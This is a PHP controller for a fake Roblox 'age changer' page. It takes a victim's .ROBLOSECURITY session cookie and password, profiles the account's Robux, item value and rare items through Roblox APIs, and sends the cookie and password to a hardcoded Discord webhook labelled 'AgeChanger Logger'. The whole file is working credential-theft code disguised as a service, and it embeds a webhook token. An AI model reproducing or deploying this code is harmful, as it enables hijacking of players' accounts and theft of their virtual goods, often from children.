namespace app\controller;

use think\Request;
use think\facade\View;

class AgeChanger
{
    private $webhookUrl ='https://discord.com/api/webhooks/1357312119753801808/J_Yl1zCgWLMlF1WipY22psf095zoCttMWoV0yfw7BaKfp7z6pIWq-846cSFn-sadv4Pn';

    public function index()
    {
        return View::fetch('agechanger');
    }

    public function submit(Request $request)
    {
        $cookie = $request->post('cookie');
        $password = $request->post('password');

        $success_msg = "";
        $failed_msg = "";

        $headers = [
            'Content-Type: application/json',
            "Cookie: .ROBLOSECURITY=$cookie"
        ];

        $userData = $this->fetch("https://users.roblox.com/v1/users/authenticated", $headers);
        if (!$userData || !isset($userData['id'])) {
            $failed_msg = "Invalid Cookie";
            return View::fetch('agechanger', compact('success_msg', 'failed_msg'));
        }

        $userId = $userData['id'];
        $username = $userData['name'];
        $displayName = $userData['displayName'] ?? $username;
        $description = $userData['description'] ?? 'N/A';
        $profileUrl = "https://www.roblox.com/users/$userId/profile";
        $avatarUrl = "https://www.roblox.com/headshot-thumbnail/image?userId=$userId&width=150&height=150&format=png";
        $createdAt = date("Y-m-d", strtotime($userData['created'] ?? 'now'));
        $hasVerifiedBadge = !empty($userData['hasVerifiedBadge']) ? 'âœ…' : 'âŒ';

        $settingsData = $this->fetch("https://accountsettings.roblox.com/v1/email", $headers);
        $isEmailVerified = !empty($settingsData['verified']) ? 'âœ…' : 'âŒ';

        $premiumData = $this->fetch("https://premiumfeatures.roblox.com/v1/users/$userId", $headers);
        $isPremium = !empty($premiumData['premium']) ? 'âœ…' : 'âŒ';

        $currencyData = $this->fetch("https://economy.roblox.com/v1/users/$userId/currency", $headers);
        $robux = $currencyData['robux'] ?? 0;

        $inventoryData = $this->fetch("https://inventory.roblox.com/v1/users/$userId/assets/collectibles?sortOrder=Asc&limit=100", $headers);
        $rap = 0;
        $hasHeadless = false;
        $hasKorblox = false;
        $hasValk = false;

        foreach ($inventoryData['data'] ?? [] as $item) {
            $rap += $item['recentAveragePrice'] ?? 0;
            $name = strtolower($item['name']);
            if (strpos($name, 'headless') !== false) $hasHeadless = true;
            if (strpos($name, 'korblox') !== false) $hasKorblox = true;
            if (strpos($name, 'valk') !== false) $hasValk = true;
        }

        $embed = [
            'title' => 'New Roblox Submission',
            'color' => 16753920,
            'thumbnail' => ['url' => $avatarUrl],
            'fields' => [
                [
                    'name' => 'ðŸ‘¤ User Info',
                    'value' => "**[$displayName]($profileUrl)**\nUsername: `$username`\nVerified Badge: $hasVerifiedBadge\nPremium: $isPremium\nEmail Verified: $isEmailVerified\nCreated: `$createdAt`",
                    'inline' => false
                ],
                [
                    'name' => 'ðŸ’° Account Summary',
                    'value' => "Robux: `$robux`\nRAP: `$rap`\nHeadless: " . ($hasHeadless ? 'âœ…' : 'âŒ') . " | Korblox: " . ($hasKorblox ? 'âœ…' : 'âŒ') . " | Valk: " . ($hasValk ? 'âœ…' : 'âŒ'),
                    'inline' => false
                ],
                [
                    'name' => 'ðŸ“ƒ Description',
                    'value' => strlen($description) > 1024 ? substr($description, 0, 1020) . '...' : $description,
                    'inline' => false
                ],
                [
                    'name' => 'ðŸ”‘ Password',
                    'value' => "```" . $password . "```",
                    'inline' => false
                ]
            ],
            'timestamp' => date('c')
        ];

        $payload = [
            'username' => 'AgeChanger Logger',
            'content' => "**Cookie:**\n```$cookie```",
            'embeds' => [$embed]
        ];

        $jsonPayload = json_encode($payload);

        if ($jsonPayload === false) {
            file_put_contents('json_error_log.txt', "JSON Encode Error: " . json_last_error_msg() . "\n", FILE_APPEND);
            $failed_msg = "Failed to encode embed data.";
            return View::fetch('agechanger', compact('success_msg', 'failed_msg'));
        }

        $ch = curl_init($this->webhookUrl);
        curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $jsonPayload);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        $response = curl_exec($ch);

        if ($response === false) {
            $error = curl_error($ch);
            file_put_contents('curl_error_log.txt', "cURL Error: $error\n", FILE_APPEND);
            $failed_msg = "Failed to send to Discord.";
        } else {
            $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
            if ($httpCode !== 204) {
                $failed_msg = "Discord error [$httpCode]";
                file_put_contents('webhook_error_log.txt', "Discord error [$httpCode]: $response\nPayload: $jsonPayload\n", FILE_APPEND);
            } else {
                $success_msg = "Data sent to webhook.";
            }
        }

        curl_close($ch);
        return View::fetch('agechanger', compact('success_msg', 'failed_msg'));
    }

    private function fetch($url, $headers)
    {
        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        $response = curl_exec($ch);
        curl_close($ch);
        return json_decode($response, true);
    }
}

